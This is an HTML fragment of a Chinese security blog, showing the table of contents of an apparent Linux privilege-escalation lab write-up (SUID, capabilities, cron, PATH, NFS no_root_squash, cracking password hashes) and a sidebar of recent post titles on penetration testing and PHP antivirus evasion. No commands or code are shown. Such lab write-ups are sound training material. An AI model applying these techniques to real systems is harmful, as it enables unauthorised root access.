href="#frank-%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E5%80%BC%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%9F"><span class="toc-number">4.2.4.</span> <span class="toc-text">frank 的密码哈希值是多少？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">5.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9Anano%E6%8F%90%E6%9D%83%EF%BC%88nano%E5%85%B7%E6%9C%89suid%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">例子：nano提权（nano具有suid）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.2.1.</span> <span class="toc-text">破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-number">5.2.2.</span> <span class="toc-text">添加用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E4%BB%A5%E5%8F%8A%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98"><span class="toc-number">5.3.</span> <span class="toc-text">实操以及回答问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%B8%AA%E7%94%A8%E6%88%B7%E5%88%86%E4%BA%AB%E4%BA%86%E4%B8%80%E4%BD%8D%E4%BC%9F%E5%A4%A7%E7%9A%84%E6%BC%AB%E7%94%BB%E4%BD%9C%E5%AE%B6%E7%9A%84%E5%90%8D%E5%AD%97%EF%BC%9F"><span class="toc-number">5.3.1.</span> <span class="toc-text">哪个用户分享了一位伟大的漫画作家的名字？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user2-%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">5.3.2.</span> <span class="toc-text">user2 的密码是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3-txt-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">5.3.3.</span> <span class="toc-text">flag3.txt 文件的内容是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%9F%E8%83%BD%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">利用功能提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">6.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98-2"><span class="toc-number">6.2.</span> <span class="toc-text">回答问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%85%B7%E6%9C%89-set-%E5%8A%9F%E8%83%BD%EF%BC%9F"><span class="toc-number">6.2.1.</span> <span class="toc-text">有多少个二进制文件具有 set 功能？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%85%B6%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E5%93%AA%E4%BA%9B%E5%85%B6%E4%BB%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">6.2.2.</span> <span class="toc-text">还可以通过其功能使用哪些其他二进制文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4-txt-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">6.2.3.</span> <span class="toc-text">flag4.txt 文件的内容是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">利用定时任务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">7.1.</span> <span class="toc-text">适用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">7.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="toc-number">7.3.</span> <span class="toc-text">实操</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98-3"><span class="toc-number">7.4.</span> <span class="toc-text">回答问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag5-txt-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">7.4.1.</span> <span class="toc-text">flag5.txt 文件的内容是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Matt-%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">7.4.2.</span> <span class="toc-text">Matt 的密码是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PATH%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">利用PATH变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">8.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-2"><span class="toc-number">8.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">NFS提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%EF%BC%9A%E6%9C%89%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E9%85%8D%E7%BD%AE%E4%BA%86no-root-squash%E5%8F%82%E6%95%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E5%9C%A8root%E8%BF%9B%E8%A1%8C"><span class="toc-number">9.0.1.</span> <span class="toc-text">前提：有个文件夹配置了no_root_squash参数，然后创建恶意可执行文件需要在root进行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-3"><span class="toc-number">9.1.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">10.</span> <span class="toc-text">练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80%E4%B8%8B"><span class="toc-number">10.1.</span> <span class="toc-text">信息收集一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc-number">10.2.</span> <span class="toc-text">思路1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">10.2.1.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc-number">10.3.</span> <span class="toc-text">思路2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">11.</span> <span class="toc-text">最后</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/08/13/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E8%8B%A5%E4%BE%9D/1/" title="ruoyi-vue的一次渗透"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ruoyi-vue的一次渗透"/></a><div class="content"><a class="title" href="/2025/08/13/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E8%8B%A5%E4%BE%9D/1/" title="ruoyi-vue的一次渗透">ruoyi-vue的一次渗透</a><time datetime="2025-08-12T16:00:00.000Z" title="发表于 2025-08-13 00:00:00">2025-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/06/%E8%AE%B0%E5%BD%95/day/bc%E7%BD%91%E7%AB%99/sql%E6%B3%A8%E5%85%A5/" title="黑产day，也没验证成功，纯当记录"><img src="/img/c1/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="黑产day，也没验证成功，纯当记录"/></a><div class="content"><a class="title" href="/2025/08/06/%E8%AE%B0%E5%BD%95/day/bc%E7%BD%91%E7%AB%99/sql%E6%B3%A8%E5%85%A5/" title="黑产day，也没验证成功，纯当记录">黑产day，也没验证成功，纯当记录</a><time datetime="2025-08-05T16:00:00.000Z" title="发表于 2025-08-06 00:00:00">2025-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%88%9F%E5%B1%B1%E6%95%B0%E6%8D%AE%E5%B1%80/1/" title="某市hw记录"><img src="/img/c1/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某市hw记录"/></a><div class="content"><a class="title" href="/2025/08/05/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%88%9F%E5%B1%B1%E6%95%B0%E6%8D%AE%E5%B1%80/1/" title="某市hw记录">某市hw记录</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/" title="上门复测某运营商的中毒处置"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="上门复测某运营商的中毒处置"/></a><div class="content"><a class="title" href="/2025/07/28/%E5%B7%A5%E4%BD%9C/%E5%A4%8D%E6%B5%8B/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%A4%84%E7%BD%AE%E5%90%8E%E7%9A%84%E5%A4%8D%E6%B5%8B/%E4%B8%AD%E7%A7%BB%E9%93%81%E9%80%9A/" title="上门复测某运营商的中毒处置">上门复测某运营商的中毒处置</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/27/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80/php/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%BB%A5%E5%8F%8A%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="[瞎琢磨]php免杀研究1"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[瞎琢磨]php免杀研究1"/></a><div class="content"><a class="title" href="/2025/07/27/%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80/php/%E6%97%A0%E5%AD%97%E6%AF%8D%E4%BB%A5%E5%8F%8A%E9%83%A8%E5%88%86%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/" title="[瞎琢磨]php免杀研究1">[瞎琢磨]php免杀研究1</a><time datetime="2025-07-26T16:00:00.000Z" title="发表于 2025-07-27 00:00:00">2025-07-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>